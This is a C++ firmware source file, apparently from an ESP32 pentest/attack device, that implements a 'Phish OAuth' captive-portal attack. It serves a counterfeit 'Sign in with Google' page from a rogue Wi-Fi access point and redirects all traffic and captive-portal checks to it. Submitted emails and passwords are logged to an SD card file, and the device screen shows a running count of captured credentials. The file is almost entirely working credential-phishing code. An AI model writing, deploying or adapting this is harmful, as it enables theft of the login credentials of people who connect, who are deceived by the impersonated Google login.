#include "arsenal.h"
#include "core/display.h"
#include "core/mykeyboard.h"
#include "core/sd_functions.h"
#include <SD.h>
#include <WiFi.h>
#include <AsyncTCP.h>
#include <ESPAsyncWebServer.h>
#include <globals.h>

static AsyncWebServer *phishServer = nullptr;
static int credsCaptured = 0;

static const char OAUTH_HTML[] PROGMEM = R"rawliteral(
<!DOCTYPE html><html><head><title>Sign in</title>
<style>body{font-family:'Segoe UI',sans-serif;background:#fff;color:#333;display:flex;justify-content:center;align-items:center;min-height:100vh;margin:0}
.c{text-align:center;max-width:360px;width:90%}
input{width:100%;padding:12px;margin:6px 0;border:1px solid #ccc;border-radius:4px;box-sizing:border-box;font-size:0.95rem}
button{width:100%;padding:12px;margin-top:12px;border:none;background:#4285f4;color:#fff;border-radius:4px;font-size:0.95rem;cursor:pointer}
h2{margin-bottom:24px;font-weight:400}
.logo{color:#4285f4;font-size:2rem;font-weight:bold;margin-bottom:8px}
p{font-size:0.8rem;color:#888;margin-top:16px}</style></head>
<body><div class="c"><div class="logo">G</div>
<h2>Sign in with Google</h2>
<input type="email" placeholder="Email or phone" name="email"><br>
<input type="password" placeholder="Password" name="pass"><br>
<button onclick="fetch('/submit',{method:'POST',body:JSON.stringify({e:document.querySelector('[name=email]').value,p:document.querySelector('[name=pass]').value})}).then(()=>this.textContent='Done')">Next</button>
<p>By signing in, you agree to our Terms of Service.</p></div></body></html>
)rawliteral";

static void setupPhishRoutes() {
    phishServer->on("/", HTTP_GET, [](AsyncWebServerRequest *request) {
        request->send(200, "text/html", OAUTH_HTML);
    });
    phishServer->on("/submit", HTTP_POST, [](AsyncWebServerRequest *request) {},
        NULL,
        [](AsyncWebServerRequest *request, uint8_t *data, size_t len, size_t index, size_t total) {
            credsCaptured++;
            if (setupSdCard()) {
                File f = SD.open("/arsenal/creds.txt", FILE_APPEND);
                if (f) { f.println("[oauth] " + String((char *)data).substring(0, len)); f.close(); }
            }
            request->send(200, "application/json", "{\"ok\":true}");
        });
    phishServer->on("/generate_204", HTTP_GET, [](AsyncWebServerRequest *request) {
        request->redirect("http://192.168.4.1");
    });
    phishServer->onNotFound([](AsyncWebServerRequest *request) {
        request->redirect("http://192.168.4.1");
    });
}

void arsenal_phish_oauth(void) {
    ARSENAL_HEAP_CHECK();
    credsCaptured = 0;
    phishServer = new AsyncWebServer(80);
    setupPhishRoutes();
    phishServer->begin();

    while (true) {
        drawMainBorderWithTitle("Phish OAuth");
        int y = 45;
        tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);
        tft.setTextSize(FP);
        tft.setCursor(12, y);
        tft.printf("Clients: %d  Creds: %d", WiFi.softAPgetStationNum(), credsCaptured);
        y += 14;
        tft.setCursor(12, y);
        tft.printf("IP: %s", WiFi.softAPIP().toString().c_str());
        tft.setTextColor(TFT_YELLOW, bruceConfig.bgColor);
        tft.drawCentreString("Esc:stop", tftWidth / 2, tftHeight - 20, 1);
        if (check(EscPress)) break;
        delay(200);
    }

    phishServer->end();
    delete phishServer;
    phishServer = nullptr;
}
